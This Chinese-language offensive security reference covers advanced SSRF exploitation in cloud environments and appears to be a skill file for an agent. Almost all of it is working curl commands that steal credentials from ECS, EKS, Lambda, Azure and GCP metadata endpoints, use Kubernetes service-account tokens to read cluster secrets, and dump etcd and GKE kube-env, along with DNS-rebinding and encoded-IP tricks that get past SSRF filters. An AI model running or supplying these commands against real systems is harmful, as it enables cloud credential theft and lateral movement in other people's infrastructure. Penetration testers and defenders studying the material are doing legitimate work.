# 云环境 SSRF 进阶利用

> **基础元数据端点**（AWS/GCP/Azure/阿里云/腾讯云）和凭据提取完整流程见 `/skill:cloud-metadata`。本文档聚焦 SSRF 场景下的进阶利用：容器/Serverless 凭据、K8s 横向、绕过技术。

---

## 容器与 Serverless 凭据

### ECS 容器凭据

ECS Task 凭据端点不同于 EC2 IMDS，需先通过环境变量或 LFI 获取相对路径：

```bash
# file:///proc/self/environ → 找到 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

### EKS Pod Identity 凭据

EKS 注入 `AWS_CONTAINER_CREDENTIALS_FULL_URI` 和 Token 文件，SSRF + LFI 组合可窃取：

```bash
AUTH=$(cat /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token)
curl -s -H "Authorization: $AUTH" "$AWS_CONTAINER_CREDENTIALS_FULL_URI"
```

### Lambda 环境变量

Lambda 凭据在环境变量中，需通过 `file:///proc/self/environ` 提取 `AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`、`AWS_SESSION_TOKEN`。运行时事件数据：

```bash
curl -s http://localhost:9001/2018-06-01/runtime/invocation/next
```

### Azure App Service / Functions

通过环境变量 `IDENTITY_ENDPOINT` 和 `IDENTITY_HEADER` 获取 Token：

```bash
curl -s "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
```

### GCP beta 端点（无需 Header）

```bash
# 无需 Metadata-Flavor: Google 头——在无法控制请求头的 SSRF 场景中关键
curl -s http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

### GCP Audience-bound Identity Token

用于访问私有 Cloud Run / IAP 后端：

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://TARGET.run.app"
```

---

## Kubernetes 横向利用

### Service Account Token

```bash
# 默认挂载路径
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 使用 Token 访问 API Server
curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

### etcd 未授权访问

```bash
curl -s http://127.0.0.1:2379/version
curl -s http://127.0.0.1:2379/v2/keys/?recursive=true
```

### GKE kube-env 泄露

```bash
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

---

## SSRF 场景下的元数据绕过

### 无 Header SSRF 可用端点

当 SSRF 无法携带自定义 Header 时：

| 云平台 | 可用端点 | 说明 |
|--------|---------|------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | 无需 Header |
| GCP v1beta1 | `http://metadata.google.internal/computeMetadata/v1beta1/` | 无需 `Metadata-Flavor` |
| Azure instanceinfo | `http://169.254.169.254/metadata/v1/instanceinfo` | 无需 `Metadata: true` |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` | 无需 Header |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` | 无需 Header |

### DNS Rebinding 绕过

域名先解析到公网 IP 通过 SSRF 过滤检查，TTL 过期后 Rebinding 到 `169.254.169.254`：

```bash
# Singularity
python3 singularity.py --lhost <your_ip> --rhost 169.254.169.254 \
  --domain rebinder.test --http-port 8080

# 简易测试: rbndr.us, lock.cmpxchg8b.com
```

### IPv6 与编码变体

```http
http://[::ffff:169.254.169.254]/latest/meta-data/
http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
http://2852039166/latest/meta-data/           # 十进制
http://0xa9fea9fe/latest/meta-data/           # 十六进制
http://0251.0376.0251.0376/latest/meta-data/  # 八进制
```

### 302 重定向绕过 Header 限制

自控服务器返回 302 到元数据端点，某些 HTTP 客户端跟随重定向时可能保留原始 Header 或丢弃 `Host` 头但携带 Cookie。

### IMDSv2 绕过条件

IMDSv2 的 PUT + Token 机制在以下场景可被绕过：
- SSRF 支持任意 HTTP 方法（PUT）且可设置自定义 Header
- 应用内部已有 Token 缓存（通过 LFI 读取缓存文件）
- 容器/Pod 场景下 hop limit=1 可能阻止跨容器访问
